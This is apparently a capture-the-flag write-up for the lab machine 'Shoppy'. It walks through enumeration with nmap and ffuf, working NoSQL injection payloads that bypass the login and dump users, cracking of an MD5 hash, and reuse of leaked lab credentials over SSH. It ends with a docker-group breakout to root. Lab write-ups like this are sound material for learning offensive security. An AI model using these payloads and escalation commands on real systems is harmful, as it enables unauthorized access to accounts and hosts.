
![shoppy logo](Images/shoppy%20logo.png)

# Attack Chain



# Summary

- [Enumeration](#enumeration)
	- [Web](#web)
	- [Directory fuzzing](#directory-fuzzing)
	- [Subdomain](#subdomain)
- [Bypass login panel](#bypass-login-panel)
- [Users Search](#users-search)
	- [admin info](#admin-info)
	- [FUZZ users](#fuzz-users)
	- [Crack Josh's password](#crack-joshs-password)
	- [Bonus](#bonus)
- [Mattermost](#mattermost)
- [Shell as jaeger](#shell-as-jaeger)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

---
# Enumeration


```
nmap -sVC 10.129.227.233 -oA nmap

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
```

> [!NOTE]
> **Observations**
> Only 2 ports open. 22 (SSH) and 80 (HTTP).

We have a redirection to `shoppy.htb`, let's add it to our `/etc/hosts` file.

```
echo '10.129.227.233 shoppy.htb' | tee -a /etc/hosts
```

### Web

Let's inspect the website now.

![web shoppy](Images/web%20shoppy.png)

We land on a page that display a countdown, meaning their insfrastructure has not been completely deployed yet, so we could find some vulnerabilities.

### Directory fuzzing

Let's fuzz the directories of the website.

```
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://shoppy.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 13ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 14ms]
images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 15ms]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 44ms]
login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 90ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 31ms]
Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 28ms]
Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 64ms]
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 36ms]
ADMIN                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 24ms]
exports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 44ms]
```

We have several hit, but `admin` looks interesting and display a login form.

![login shoppy](Images/login%20shoppy.png)

Unfortunately, we don't have credentials.

### Subdomain

Let's continue our enumeration by looking at the target's subdomains.

```
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt -H 'Host: FUZZ.shoppy.htb' -u 'http://shoppy.htb' -fs 169

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 59ms]
```

We found the `mattermost` vhost, let's add the entry.

```
echo '10.129.227.233 mattermost.shoppy.htb' | tee -a /etc/hosts
```

We can't login either because of the lack of credentials.

# Bypass login panel

Let's get back at our login page on the main website and try to bypass it using an SQL Injection payload such as :

```
' OR 1=1 -- -
```

It doesn't work, but maybe because it's not SQL behind it.

After a lot of tries and research, we discovered that the form is vulnerable to NoSQL injection. If we put the following payload from [HackTricks](https://hacktricks.wiki/en/pentesting-web/nosql-injection.html?highlight=nosq#sql---mongo), we can successfuly login as `admin`.   

```
admin' || 'a'=='a
```


![login success shoppy](Images/login%20success%20shoppy.png)

# Users Search

Once logged, we have the possibility to search for users and retrieve their information.
### admin info

First, we can look at our current user information.

![search users shoppy](Images/search%20users%20shoppy.png)

![admin info shoppy](Images/admin%20info%20shoppy.png)

We have the password of `admin`, but it's hashed with MD5 and this one can't be cracked.

### FUZZ users

We can use `ffuf` to enumerate other users. By copying the Network request for `curl`, we retreive the cookies headers and we can fuzz the users present on the website.

```
ffuf -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -H 'Cookie: rl_user_id=RudderEncrypt%3AU2FsdGVkX182%2BNVbnv0D4Uh9Gh3UaiaHfKn8JVk7ceJ9tA1tVzx9ehZ3g35wmy7F; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19Sl3LDVT1mK%2B0bUCz0FIimiv8yENtvGbLyj1GNmeBP27ONllG0jTKQDp6Xvag80%2Bt%2BuUsCNsG4qw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19PRdXSQvXL%2Bj8ea6HDVvwBgn4Jrno5Mxw%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2FQsK9ayooBFRvZYkbOR77xS3xGmMR9V%2B8%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19I3lANwFtqCZ7gnqE4bE%2BZHpca4%2B6REBg%3D; connect.sid=s%3AfYrDlWjc18mh775b7FqjzZYoBaHSsK3b.SkFUuZNSYALETT0IvUt3KNsZiwuSemWR2k3Mtn3uhY0' -u 'http://shoppy.htb/admin/search-users?username=FUZZ' -fs 2561 -mc 200

 :: Method           : GET
 :: URL              : http://shoppy.htb/admin/search-users?username=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
 :: Header           : Cookie: rl_user_id=RudderEncrypt%3AU2FsdGVkX182%2BNVbnv0D4Uh9Gh3UaiaHfKn8JVk7ceJ9tA1tVzx9ehZ3g35wmy7F; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19Sl3LDVT1mK%2B0bUCz0FIimiv8yENtvGbLyj1GNmeBP27ONllG0jTKQDp6Xvag80%2Bt%2BuUsCNsG4qw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19PRdXSQvXL%2Bj8ea6HDVvwBgn4Jrno5Mxw%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2FQsK9ayooBFRvZYkbOR77xS3xGmMR9V%2B8%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19I3lANwFtqCZ7gnqE4bE%2BZHpca4%2B6REBg%3D; connect.sid=s%3AfYrDlWjc18mh775b7FqjzZYoBaHSsK3b.SkFUuZNSYALETT0IvUt3KNsZiwuSemWR2k3Mtn3uhY0
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 2561
________________________________________________

admin                 [Status: 200, Size: 2720, Words: 716, Lines: 56, Duration: 107ms]
josh                  [Status: 200, Size: 2720, Words: 716, Lines: 56, Duration: 80ms]
```

We found `josh`.

### Crack Josh's password

![josh info shoppy](Images/josh%20info%20shoppy.png)

We have `josh`'s MD5 hash. This one can be cracked with https://crackstation.net.

![crackstation john shoppy](Images/crackstation%20john%20shoppy.png)

> [!TIP]
> **Credentials obtained**
> `josh` : `remembermethisway`

### Bonus

Since the target is vulnerable to **NoSQL** injection, the following payload retrieves every user entry.

```
'; return '' == '
```

# Mattermost

We finally have credentials.
After trying them on **Mattermost**, we have a session as `josh`.

![mattermost enum shoppy](Images/mattermost%20enum%20shoppy.png)

Inspecting his conversation reveals credentials for the user `jaeger`.

![credentials mattermost shoppy](Images/credentials%20mattermost%20shoppy.png)

> [!TIP]
> **Credentials obtained**
> `jaeger` : `Sh0ppyBest@pp!`

# Shell as jaeger

Let's try these credentials over SSH.

```
ssh jaeger@shoppy.htb
jaeger@shoppy.htb's password: Sh0ppyBest@pp!

jaeger@shoppy:~$
```

We have a foothold on the target. The user flag can be obtained from here.

# Lateral Movement

Looking at our `sudo` permissions reveal the following.

```
jaeger@shoppy:/home/deploy$ sudo -l
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

Running this command prompt us for a password that we don't have.

```
sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password:
```

We can retrieve the executable on our machine and try to reverse it to obtain the master password.

```
scp jaeger@shoppy.htb:/home/deploy/password-manager password-manager
```

And the we open the file with **Ghidra**.

Looking at the `main` function shows the following.


![ghidra shoppy](Images/ghidra%20shoppy.png)

It looks like it's adding letter after another to form the word `Sample`.

Let's try this word as the master password.

```
sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

It worked, we can now login as the user `deploy`.

```
jaeger@shoppy:/home/deploy$ su deploy
Password: Deploying@pp!

$ whoami
deploy
```

# Privilege Escalation

Looking at our groups, we see we are a member of `docker`, which is a known group that allows us to escalate our privileges.

```
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

By running the following command from [GTFObins](https://gtfobins.org/gtfobins/docker/), we will create a container that will replicate the target's file, and set it under `/mnt` inside the container. 

```
$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
root@3fb04ec7f48b:/#
```

We can grab the root flag under `/mnt/root/root.txt`.

> [!TIP]
> **Machine Rooted**

